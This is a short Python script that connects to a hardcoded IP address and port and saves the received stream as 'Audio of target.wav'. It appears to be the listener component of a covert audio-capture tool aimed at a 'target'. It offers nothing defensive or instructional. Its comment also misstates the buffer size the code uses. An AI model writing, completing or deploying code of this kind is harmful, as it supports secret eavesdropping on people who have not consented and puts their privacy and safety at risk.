import socket

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

client.connect(("94.156.35.196", 1112))
full_msg = b""
while True:
    msg = client.recv(30000000)
    # The buffersize is 300000000 because there is a lot of data in audio files
    if len(msg) <= 0: break
    full_msg += msg

with open("Audio of target.wav", "ab") as file:
    file.write(full_msg)